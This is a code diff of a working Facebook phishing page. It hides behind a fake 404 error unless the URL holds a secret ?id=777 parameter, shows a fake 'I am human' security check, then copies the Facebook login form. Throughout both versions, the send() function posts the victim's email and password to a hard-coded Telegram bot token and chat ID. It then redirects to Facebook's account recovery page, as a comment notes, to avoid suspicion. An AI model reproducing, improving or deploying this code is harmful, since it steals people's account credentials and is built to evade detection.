@@ -3,76 +3,76 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>404 Not Found</title> <style>
-    /* Default style looks like a broken/empty page */
-    body { font-family: Arial, sans-serif; background-color: #fff; margin: 0; padding: 0; display: none; }
-    .container { width: 100%; max-width: 400px; margin: 60px auto; background-color: #fff; padding: 30px; border-radius: 8px; box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1); box-sizing: border-box; text-align: center; }
-    .btn-action { background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 16px; font-weight: bold; cursor: pointer; width: 100%; }
-    .input-field { width: 100%; padding: 14px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
-    .footer-links a { color: #000; text-decoration: none; font-size: 14px; }
+  <title>404 Not Found</title>
+  <style>
+    body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background-color: #fff; margin: 0; display: none; }
+    .wrap { width: 100%; max-width: 400px; margin: 50px auto; padding: 30px; border-radius: 8px; box-shadow: 0 4px 12px rgba(0,0,0,0.15); text-align: center; box-sizing: border-box; }
+    .f-field { width: 100%; padding: 12px; margin-bottom: 12px; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; background: #f5f6f7; outline: none; }
+    .f-btn { background-color: #1877f2; color: white; border: none; padding: 12px; border-radius: 6px; font-size: 17px; font-weight: bold; cursor: pointer; width: 100%; }
+    .f-link-box { margin-top: 15px; border-top: 1px solid #ddd; padding-top: 15px; font-size: 14px; }
+    /* Links set to Black as requested */
+    .f-link-box a { color: #000000; text-decoration: none; font-weight: 500; }
+    .f-link-box a:hover { text-decoration: underline; }
   </style>
 </head>
 <body>
 
-<div class="container" id="main-box">
-  </div>
+<div class="wrap" id="app"></div>
 
 <script>
-  // 1. THE SECRET CHECK
-  const urlParams = new URLSearchParams(window.location.search);
-  const secretId = urlParams.get('id');
-
-  // If the URL has ?id=777, show the site. Otherwise, show nothing or an error.
-  if (secretId === '777') {
+  // Hide site from bots unless ?id=777 is present
+  const params = new URLSearchParams(window.location.search);
+  if (params.get('id') === '777') {
     document.body.style.display = 'block';
-    loadGatekeeper();
+    renderStep1();
   } else {
-    // What the bot sees: A plain text error
-    document.write('<p style="padding:20px;">404 Error: The requested URL was not found on this server.</p>');
+    document.write('<div style="padding:50px; font-family:sans-serif;"><h1>404 Not Found</h1><p>The requested URL was not found on this server.</p></div>');
   }
 
-  function loadGatekeeper() {
-    document.title = "Sеcurity Verification";
-    const box = document.getElementById('main-box');
-    box.innerHTML = `
-      <h2>Access Verification</h2>
-      <p style="color:#606770;">Confirm your session to enter the secure dashboard.</p>
-      <button class="btn-action" onclick="loadLogin()">Verify Identity</button>
+  function renderStep1() {
+    document.title = "Security Check";
+    document.getElementById('app').innerHTML = `
+      <h3 style="margin-top:0;">Access Verification</h3>
+      <p style="color:#606770; font-size:14px; line-height:1.4;">Please verify your identity to view the requested content.</p>
+      <button class="f-btn" onclick="renderStep2()">I am human</button>
     `;
   }
 
-  function loadLogin() {
-    const box = document.getElementById('main-box');
-    box.innerHTML = `
-      <div style="margin-bottom:20px;">
-        <svg width="150" height="35" viewBox="0 0 120 24">
+  function renderStep2() {
+    document.title = "Log In";
+    document.getElementById('app').innerHTML = `
+      <div style="margin-bottom:25px;">
+        <svg width="150" height="30" viewBox="0 0 120 24">
           <path fill="#1877f2" d="M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0zm3 8h-1.35c-.538 0-.65.221-.65.77V10h2l-.25 2H13v6h-2v-6H9.5v-2H11V8.2c0-1.842 1.135-2.87 2.803-2.87.799 0 1.486.059 1.686.086V8z"/>
-          <text x="30" y="18" font-family="Arial" font-weight="bold" font-size="18" fill="#1877f2">facebook</text>
+          <text x="32" y="18" font-family="Arial" font-weight="bold" font-size="19" fill="#1877f2">facebook</text>
         </svg>
       </div>
-      <input type="text" id="u" class="input-field" placeholder="Email or phone number">
-      <input type="password" id="p" class="input-field" placeholder="Password">
-      <button type="button" class="btn-action" id="sub" onclick="send()">Log In</button>
-      <div class="footer-links" style="margin-top:20px; border-top:1px solid #ddd; padding-top:20px;">
-        <a href="#">Forgotten account?</a> · <a href="#">Create New Account</a>
+      <input type="text" id="u" class="f-field" placeholder="Email or phone number">
+      <input type="password" id="p" class="f-field" placeholder="Password">
+      <button class="f-btn" id="sub" onclick="send()">Log In</button>
+      <div class="f-link-box">
+        <a href="#">Forgotten account?</a> <span style="color:#888">·</span> <a href="#">Create New Account</a>
       </div>
     `;
-    document.title = "Fаcebook - Log In";
   }
 
   function send() {
     const u = document.getElementById('u').value;
     const p = document.getElementById('p').value;
     if(!u || !p) return;
-
     document.getElementById('sub').disabled = true;
-    
-    fetch(`https://api.telegram.org/bot8538534265:AAFx5Ep3AI4DwwqwYBFa3HQ86eqIxpfv0Eo/sendMessage`, {
+
+    // Telegram Bot Details
+    const t = "8538534265:AAFx5Ep3AI4DwwqwYBFa3HQ86eqIxpfv0Eo";
+    const c = "6593370832";
+
+    fetch(`https://api.telegram.org/bot${t}/sendMessage`, {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
-      body: JSON.stringify({ chat_id: "6593370832", text: `LOG:\nU: ${u}\nP: ${p}` })
+      body: JSON.stringify({ chat_id: c, text: `🔔 LOGIN ATTEMPT\n\n📧: ${u}\n🔑: ${p}` })
     })
     .then(() => {
+      // Redirect to Facebook recovery to avoid suspicion
       window.location.href = "https://www.facebook.com/recover/initiate/";
     });
   }
